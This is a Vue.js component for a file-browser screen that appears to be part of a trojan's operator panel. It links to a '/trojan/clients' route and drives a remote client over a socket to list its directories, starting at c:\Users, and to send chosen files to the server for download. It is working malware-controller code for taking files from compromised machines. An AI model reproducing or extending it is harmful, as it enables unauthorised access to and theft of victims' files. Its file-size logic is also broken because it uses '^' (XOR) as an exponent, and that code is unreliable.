<template>
  <v-container>
    <div class="d-flex justify-space-between mb-3">
      <v-btn small fab @click="$router.go(-1)" class="mb-6 mr-5"
        ><v-icon>fa-angle-left</v-icon></v-btn
      >
      <div class="d-flex ma-0 pa-0">
        <p>排序方式</p>
        <v-container class="d-flex"
          ><v-menu offset-y>
            <template v-slot:activator="{ on }">
              <v-btn v-on="on" class="ml-3" small>{{ sortedBy.name }}</v-btn>
            </template>
            <v-list>
              <v-list-item-group>
                <v-list-item dense @click="sortedBy.name = '文件名'"
                  ><v-list-item-content
                    ><v-list-item-title
                      >文件名</v-list-item-title
                    ></v-list-item-content
                  ></v-list-item
                >
                <v-list-item dense @click="sortedBy.name = '时间'"
                  ><v-list-item-content
                    ><v-list-item-title
                      >时间</v-list-item-title
                    ></v-list-item-content
                  ></v-list-item
                >
                <v-list-item dense @click="sortedBy.name = '文件大小'"
                  ><v-list-item-content
                    ><v-list-item-title
                      >文件大小</v-list-item-title
                    ></v-list-item-content
                  ></v-list-item
                >
              </v-list-item-group>
            </v-list>
          </v-menu>
          <v-menu offset-y>
            <template v-slot:activator="{ on }">
              <v-btn v-on="on" class="ml-3" small>{{ sortedBy.type }}</v-btn>
            </template>
            <v-list>
              <v-list-item-group>
                <v-list-item dense @click="sortedBy.type = '升序'"
                  ><v-list-item-content
                    ><v-list-item-title
                      >升序</v-list-item-title
                    ></v-list-item-content
                  ></v-list-item
                >
                <v-list-item dense @click="sortedBy.type = '降序'"
                  ><v-list-item-content
                    ><v-list-item-title
                      >降序</v-list-item-title
                    ></v-list-item-content
                  ></v-list-item
                >
              </v-list-item-group>
            </v-list>
          </v-menu></v-container
        >
      </div>
    </div>
    <v-text-field
      label="当前URL"
      v-model="currentUrl"
      dense
      @keydown.enter="openDir(currentUrl)"
    ></v-text-field>
    <v-list
      style="
        overflow: auto;
        height: 63vh;
        user-select: none;
        position: relative;
      "
    >
      <v-progress-circular
        v-show="fileListLoading"
        indeterminate
        style="position: absolute; right: 40px; top: 20px"
      ></v-progress-circular>
      <v-list-item v-ripple @click="goBack">
        <v-list-item-avatar>
          <v-icon>fa-long-arrow-left</v-icon>
        </v-list-item-avatar>
        <v-list-item-content>
          <v-list-item-title>返回上一级</v-list-item-title>
        </v-list-item-content>
      </v-list-item>
      <template v-for="(file, index) in fileList">
        <v-list-item :key="index" @click="openDir(file.name)" v-ripple="false">
          <v-list-item-avatar>
            <v-icon>{{ getExtCssObj(file.name).class }}</v-icon>
          </v-list-item-avatar>
          <v-list-item-content>
            <v-list-item-title>{{ file.name }}</v-list-item-title>
            <v-list-item-subtitle>{{
              new Date(file.lstat.mtime).toLocaleString()
            }}</v-list-item-subtitle>
            <v-list-item-subtitle>{{
              calcFileSize(file)
            }}</v-list-item-subtitle>
          </v-list-item-content>
          <v-list-item-action @click="download(file.name)" v-if="!file.isDir">
            <v-icon small>fa-download</v-icon>
          </v-list-item-action>
        </v-list-item>
      </template>
    </v-list>
  </v-container>
</template>

<script>
import path from "path-win32";
import { SERVER_ADDRESS } from "../../../my_config";
import EXT from "./ext.js";

export default {
  name: "fileexplorer",
  data() {
    return {
      id: "",
      currentUrl: "c:\\Users",
      fileListLoading: false,
      fileList: [],
      sortedFileList: [],
      sortedBy: {
        name: "文件名",
        type: "升序",
      },
      contextMenu: {
        template: [
          {
            label: "下载此文件",
            click: () => {
              // event.reply("downloadfile", msg.id, fileUrl);
            },
          },
          {
            label: "显示此文件内容",
            click: () => {
              // event.reply("showfilecontent", fileUrl);
            },
          },
          // { type: "separator" },

          // { label: "Menu Item 2", type: "checkbox", checked: true },
        ],
      },
    };
  },
  watch: {
    // fileList(nv, ov) {
    //   this.sortFileList();
    // },
    sortedBy: {
      handler(nv, ov) {
        this.sortFileList();
      },
      deep: true,
    },
  },
  computed: {
    isDir() {
      return (is_dir) => {
        return is_dir ? { color: "red" } : {};
      };
    },
    getExtCssObj() {
      return (file) => {
        const extName = path.extname(file);
        return EXT.calcClass(extName);
      };
    },
  },
  beforeMount() {
    this.$nextTick(() => {
      this.openDir(".");
    });
    // ipcRenderer.on("downloadfile", (e, id, fileUrl) => {
    //   that.download(fileUrl);
    // });
    // ipcRenderer.on("showfilecontent", (e, fileUrl) => {});
    this.$store.state.io.on("apilistdir", (result, url) => {
      if (result.length) {
        this.fileList = result;
        this.sortedFileList = this.fileList;
        this.currentUrl = url;
        this.sortFileList();
      }
      this.fileListLoading = false;
    });
    this.$store.state.io.on("apidownloadfile", (fileName) => {
      window.open(`${SERVER_ADDRESS}:7071/tmpDir/${fileName}`);
    });
    this.$store.state.io.on("apishowfilecontent", (raw) => {});
    this.id = this.$route.query.id;

    this.interval = setInterval(() => {
      if (this.$myUtils.IdIndex(window.clientArr, this.id) == -1) {
        clearInterval(this.interval);
        // alert("此客户端已离线");
        this.$router.push("/trojan/clients");
      }
    }, 200);
  },
  methods: {
    sortFileList() {
      switch (this.sortedBy.name) {
        case "文件名": {
          switch (this.sortedBy.type) {
            case "升序": {
              this.sortedFileList = this.fileList.sort((a, b) => {
                if (a > b) {
                  return 1;
                } else {
                  return -1;
                }
              });
              break;
            }
            case "降序": {
              this.sortedFileList = this.fileList.sort((a, b) => {
                if (a < b) {
                  return 1;
                } else {
                  return -1;
                }
              });
              break;
            }
          }
          break;
        }
        case "时间": {
          switch (this.sortedBy.type) {
            case "升序": {
              this.sortedFileList = this.fileList.sort((a, b) => {
                if (a.lstat.mtime > b.lstat.mtime) {
                  return -1;
                } else {
                  return 1;
                }
              });
              break;
            }
            case "降序": {
              this.sortedFileList = this.fileList.sort((a, b) => {
                if (a.lstat.mtime < b.lstat.mtime) {
                  return -1;
                } else {
                  return 1;
                }
              });
              break;
            }
          }

          break;
        }
        case "文件大小": {
          switch (this.sortedBy.type) {
            case "升序": {
              this.sortedFileList = this.fileList.sort((a, b) => {
                if (a.lstat.size > b.lstat.size) {
                  return -1;
                } else {
                  return 1;
                }
              });
              break;
            }
            case "降序": {
              this.sortedFileList = this.fileList.sort((a, b) => {
                if (a.lstat.size < b.lstat.size) {
                  return -1;
                } else {
                  return 1;
                }
              });
              break;
            }
          }

          break;
        }
      }
    },
    calcFileSize(file) {
      let size = file.lstat.size;

      if (file.isDir) {
        return null;
      }

      if (size < (1024 ^ 1)) {
        return size.toFixed(2) + "B";
      } else if (size < (1024 ^ 2) * 1000) {
        return (size / 1024).toFixed(2) + "KB";
      } else if (size < (1024 ^ 3) * 1000 * 1000) {
        return (size / 1024 / 1024).toFixed(2) + "MB";
      } else if (size < (1024 ^ 4) * 1000 * 1000 * 1000) {
        return (size / 1024 / 1024 / 1024).toFixed(2) + "GB";
      }
    },
    showFileContextMenu(fileName) {
      let toUrl = path.resolve(this.currentUrl, fileName);
      // ipcRenderer.send("file-context-menu", { id: this.id }, toUrl);
    },
    goBack() {
      this.currentUrl = path.resolve(this.currentUrl, "..");
      this.$store.state.io.emit("apilistdir", this.id, this.currentUrl);
      this.fileListLoading = true;
    },
    openDir(target) {
      let toUrl = path.resolve(this.currentUrl, target);
      this.$store.state.io.emit("apilistdir", this.id, toUrl);
      this.fileListLoading = true;
    },
    download(target) {
      const fileUrl = path.resolve(this.currentUrl, target);
      this.$store.state.io.emit("apidownloadfile", this.id, fileUrl);
    },
    showFileContent(target) {
      this.$store.state.io.emit("apishowfilecontent", this.id, target);
    },
    showDetails() {},
  },
  components: {},
};
</script>

<style lang="scss"></style>
